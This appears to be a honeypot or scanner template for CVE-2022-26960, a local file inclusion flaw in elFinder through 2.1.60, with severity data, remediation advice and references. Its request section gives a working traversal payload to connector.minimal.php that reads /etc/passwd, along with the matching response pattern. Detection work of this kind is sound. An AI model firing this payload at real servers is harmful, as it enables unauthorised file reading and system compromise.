id: CVE-2022-26960
info:
  name: elFinder <=2.1.60 - Local File Inclusion
  author: pikpikcu
  description: 'elFinder through 2.1.60 is affected by local file inclusion via connector.minimal.php.
    This allows unauthenticated remote attackers to read, write, and browse files
    outside the configured document root. This is due to improper handling of absolute
    file paths.

    '
  severity: critical
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access to sensitive files, remote code execution, and potential compromise of
    the entire system.

    '
  remediation: 'Upgrade elFinder to version 2.1.61 or later to mitigate this vulnerability.

    '
  reference:
  - https://www.synacktiv.com/publications/elfinder-the-story-of-a-repwning.html
  - https://github.com/Studio-42/elFinder/commit/3b758495538a448ac8830ee3559e7fb2c260c6db
  - https://www.synacktiv.com/publications.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-26960
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2022-26960
    cwe-id: CWE-22
    epss-score: 0.85922
    epss-percentile: 0.98481
    cpe: cpe:2.3:a:std42:elfinder:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: std42
    product: elfinder
  tags: cve2022,cve,lfi,elfinder,std42
traps:
- request:
    method: GET
    path: /elfinder/php/connector.minimal.php?cmd=file&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@/base64>&download=1
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: ''
  response:
    status_code: 200
    headers: {}
    body: 'root:.*:0:0:'
